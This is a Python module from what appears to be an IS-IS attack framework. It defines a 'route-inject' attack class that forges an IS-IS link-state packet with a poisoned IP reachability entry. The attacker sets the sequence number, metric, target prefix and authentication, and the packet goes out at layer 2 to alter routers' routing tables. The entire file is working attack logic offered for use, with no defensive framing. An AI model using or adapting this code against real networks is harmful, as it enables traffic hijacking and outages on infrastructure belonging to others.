from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import LSPConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender


class RouteInjectAttack(BaseAttack):
    name = "route-inject"
    description = "注入含毒化 IP Reachability TLV 的 LSP 篡改路由表"
    category = AttackCategory.LSP
    config: LSPConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        lsp_id = self.config.lsp_id
        if not lsp_id:
            lsp_id = f"{self.config.sys_id}.00-00"
        auth_type = {"none": 0, "plain": 1, "md5": 2}.get(self.config.auth_type, 0)
        auth_key = self.config.auth_key.encode() if self.config.auth_key else b""
        pkt = build_lsp_with_tlvs(
            sys_id=self.config.sys_id,
            lsp_id=lsp_id,
            src_mac=self._src_mac,
            level=self.config.level,
            sequence=self.config.sequence,
            remaining_lifetime=self.config.remaining_lifetime,
            metric=self.config.metric,
            network_addr=self.config.network_addr,
            network_mask=self.config.network_mask,
            auth_type=auth_type,
            auth_key=auth_key,
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"路由注入: LSP={lsp_id}, metric={self.config.metric}, net={self.config.network_addr}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
